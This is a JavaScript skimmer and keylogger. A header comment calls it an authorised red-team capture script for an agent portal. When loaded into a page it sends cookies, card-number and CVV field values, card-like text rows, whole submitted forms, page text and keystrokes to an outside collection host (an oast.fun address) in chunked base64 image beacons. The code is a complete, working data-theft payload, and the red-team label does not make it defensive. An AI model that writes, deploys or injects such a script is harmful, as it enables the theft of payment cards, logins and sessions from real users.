/* JF AGENT PORTAL — live capture v2 (authorised red-team, operator Malik)
   captures: cookies, page text w/ card patterns, card-like inputs, form submits, keystrokes */
(function () {
  var C = 'https://dar28sje9202lj4kkc0gcja65cienyp8a.oast.fun';
  var MAX = 1100;
  function b64(s) { try { return btoa(unescape(encodeURIComponent(s))); } catch (e) { return ''; } }
  function send(tag, obj) {
    try {
      var s = b64(typeof obj === 'string' ? obj : JSON.stringify(obj));
      if (!s) return;
      for (var i = 0, n = 0; i < s.length; i += MAX, n++) {
        new Image().src = C + '/' + tag + '/' + n + '/' + s.length + '?' + s.substr(i, MAX);
      }
    } catch (e) { }
  }
  var RX = /card|cvv|cvc|ccnum|cc_num|ccno|pan|expir|credit|安全码|卡号|信用卡|payor|pay_to|bank_name|cheque/i;
  var CARDROW = /\[[^\]\[]{2,60}\]\[[0-9]{3,8}\]\[[0-9]{3,6}\]\[[0-9]{2}\]\[[0-9]{2}\]/g;

  function scanInputs() {
    var out = [], els = document.querySelectorAll('input,select,textarea');
    for (var i = 0; i < els.length; i++) {
      var el = els[i];
      var sig = ((el.name || '') + ' ' + (el.id || '') + ' ' + (el.placeholder || '') + ' ' +
        (el.className || '')).toLowerCase();
      if (RX.test(sig)) out.push({ n: el.name || el.id, v: String(el.value || '').slice(0, 120) });
    }
    if (out.length) send('CARDIN', { u: location.href, f: out });
  }
  function scanText() {
    try {
      var t = document.body ? document.body.innerText : '';
      var m = t.match(CARDROW);
      if (m && m.length) send('CARDDISPLAY', { u: location.href, n: m.length, r: m.slice(0, 40) });
      if (/payment|commission|premium|invoice|policy|claim|agent|commission/i.test(document.title)) {
        send('PAGE', { u: location.href, t: document.title, x: t.slice(0, 4000) });
      }
    } catch (e) { }
  }
  document.addEventListener('submit', function (e) {
    try {
      var f = e.target, d = {}, fd = new FormData(f);
      fd.forEach(function (v, k) { d[k] = String(v).slice(0, 200); });
      send('FORM', { u: location.href, a: f.action, d: d });
    } catch (x) { }
  }, true);
  var buf = '';
  document.addEventListener('keydown', function (e) {
    try {
      buf += e.key;
      if (buf.length >= 40) { send('KEY', { u: location.href, d: buf }); buf = ''; }
    } catch (x) { }
  }, true);
  send('ALIVE', { u: location.href, t: document.title, c: document.cookie, h: document.documentElement.innerHTML.length });
  setTimeout(scanText, 3000);
  setTimeout(scanText, 9000);
  setInterval(scanInputs, 2500);
})();
